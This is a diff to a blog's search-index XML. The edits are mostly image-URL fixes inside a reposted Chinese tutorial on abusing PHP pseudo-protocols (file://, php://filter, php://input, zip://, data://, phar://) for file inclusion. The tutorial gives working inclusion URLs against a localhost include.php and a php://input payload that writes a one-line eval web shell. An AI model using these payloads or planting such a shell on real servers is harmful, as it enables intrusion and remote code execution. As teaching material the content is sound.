@@ -1,10 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>phpserializezongjie</title>
+    <url>/phpserializezongjie.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>PHP伪协议总结</title>
     <url>/phpweixieyizongjie.html</url>
-    <content><![CDATA[<h1 id="PHP伪协议总结"><a href="#PHP伪协议总结" class="headerlink" title="PHP伪协议总结"></a><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">PHP伪协议总结</a></h1><p><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">转文章，侵删</a>记录总结了PHP伪协议全面的利用姿势</p>
-<p><img src="https://sponsor.segmentfault.com/lg.php?bannerid=0&amp;campaignid=0&amp;zoneid=25&amp;loc=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000018991087&amp;referer=https%3A%2F%2Fwww.cnblogs.com%2F&amp;cb=4a1a34a668" alt="img"></p>
+    <content><![CDATA[<h1 id="PHP伪协议总结"><a href="#PHP伪协议总结" class="headerlink" title="PHP伪协议总结"></a>PHP伪协议总结</h1><p><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">转文章，侵删</a>记录总结了PHP伪协议全面的利用姿势</p>
 <blockquote>
 <p>参考了这篇文章：<a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">php伪协议实现命令执行的七种姿势</a>，并根据自己理解进行了总结，也算是加深一下印象，方便以后使用。</p>
 </blockquote>
@@ -30,13 +34,13 @@ file:///path/to/file.ext</code></pre></li>
 <li><p><strong>示例</strong>：</p>
 <ol>
 <li><p><code>file://[文件的绝对路径和文件名]</code></p>
-<pre><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172418" alt="图片描述"></p>
+<pre><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172418.png" alt="图片描述"></p>
 </li>
 <li><p><code>[文件的相对路径和文件名]</code></p>
-<pre><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172419" alt="图片描述"></p>
+<pre><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172419.png" alt="图片描述"></p>
 </li>
 <li><p><code>[http：//网络路径和文件名]</code></p>
-<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172420" alt="图片描述"></p>
+<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172420.png" alt="图片描述"></p>
 </li>
 </ol>
 </li>
@@ -192,16 +196,16 @@ file:///path/to/file.ext</code></pre></li>
 <li><p><strong>示例</strong>：</p>
 <ol>
 <li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
-<pre><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172421" alt="图片描述"></p>
+<pre><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172421.png" alt="图片描述"></p>
 </li>
 <li><p><code>php://input + [POST DATA]</code>执行php代码</p>
 <pre><code>http://127.0.0.1/include.php?file=php://input
 [POST DATA部分]
-&lt;?php phpinfo(); ?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172422" alt="图片描述"></p>
+&lt;?php phpinfo(); ?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172422.png" alt="图片描述"></p>
 <p>若有写入权限，写入一句话木马</p>
 <pre><code>http://127.0.0.1/include.php?file=php://input
 [POST DATA部分]
-&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172423" alt="图片描述"></p>
+&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172423.png" alt="图片描述"></p>
 </li>
 </ol>
 </li>
@@ -221,15 +225,15 @@ file:///path/to/file.ext</code></pre></li>
 <ol>
 <li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p>
 <p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
-<pre><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172424" alt="图片描述"></p>
+<pre><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172424.png" alt="图片描述"></p>
 </li>
 <li><p><code>compress.bzip2://file.bz2</code></p>
 <p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
-<pre><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172425" alt="图片描述"></p>
+<pre><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172425.png" alt="图片描述"></p>
 </li>
 <li><p><code>compress.zlib://file.gz</code></p>
 <p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
-<pre><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172426" alt="图片描述"></p>
+<pre><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172426.png" alt="图片描述"></p>
 </li>
 </ol>
 </li>
@@ -251,10 +255,10 @@ data://text/plain;base64,</code></pre></li>
 <li><p><strong>示例</strong>：</p>
 <ol>
 <li><p><code>data://text/plain,</code></p>
-<pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172427" alt="图片描述"></p>
+<pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172427.png" alt="图片描述"></p>
 </li>
 <li><p><code>data://text/plain;base64,</code></p>
-<pre><code>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172428" alt="图片描述"></p>
+<pre><code>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172428.png" alt="图片描述"></p>
 </li>
 </ol>
 </li>
@@ -276,11 +280,11 @@ https://example.com
 https://example.com/file.php?var1=val1&amp;var2=val2
 https://user:password@example.com</code></pre></li>
 <li><p><strong>示例</strong>：</p>
-<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172429" alt="图片描述"></p>
+<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172429.png" alt="图片描述"></p>
 </li>
 </ul>
 <h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><code>phar://</code> 协议</h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
-<pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172430" alt="图片描述"></p>
+<pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172430.png" alt="图片描述"></p>
 <p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p>
 <p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>
 <blockquote>
